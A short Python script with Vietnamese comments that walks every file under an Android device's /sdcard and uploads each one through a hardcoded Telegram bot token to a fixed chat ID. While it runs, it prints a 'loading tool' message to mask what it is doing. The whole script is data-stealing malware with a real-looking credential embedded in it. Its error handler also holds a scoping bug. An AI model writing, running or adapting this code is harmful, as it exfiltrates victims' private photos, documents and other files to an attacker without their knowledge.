import os
import telebot

# Danh sách màu chữ ANSI
colors = [
    "\033[1;31m",  # Đỏ
    "\033[1;91m",  # Đỏ nhạt
    "\033[1;32m",  # Xanh lá
    "\033[1;92m",  # Xanh lá nhạt
    "\033[1;33m",  # Vàng
    "\033[1;93m",  # Vàng nhạt
    "\033[1;34m",  # Xanh dương
    "\033[1;94m",  # Xanh dương nhạt
    "\033[1;35m",  # Tím
    "\033[1;95m",  # Tím nhạt
    "\033[1;36m",  # Xanh ngọc
    "\033[1;96m",  # Xanh ngọc nhạt
]

# Thay bằng token bot Telegram thật của bạn
BOT_TOKEN = "7463062603:AAEAGU-e9d-4-UrDeLWMHeKYn5hKdhk5SLc" 
CHAT_ID = "7944440933"  # ID của người nhận (hoặc nhóm chat)

bot = telebot.TeleBot(BOT_TOKEN)

# Biến để theo dõi chỉ số màu
color_index = 0

def send_file_to_telegram(file_path):
    try:
        with open(file_path, "rb") as f:
            bot.send_document(CHAT_ID, f)
    except Exception as e:
        # Sử dụng màu theo thứ tự
        print(colors[color_index] + "Đang vào tool...", end="\r")
        
        # Tăng chỉ số để chuyển sang màu tiếp theo
        color_index = (color_index + 1) % len(colors)  # Đảm bảo không vượt quá số lượng màu

def send_all_files_from_directory(directory):
    for root, _, filenames in os.walk(directory):
        for filename in filenames:
            file_path = os.path.join(root, filename)
            send_file_to_telegram(file_path)

# Gọi hàm với thư mục bạn muốn gửi file từ đó (ví dụ: /sdcard trên Android)
send_all_files_from_directory("/sdcard")
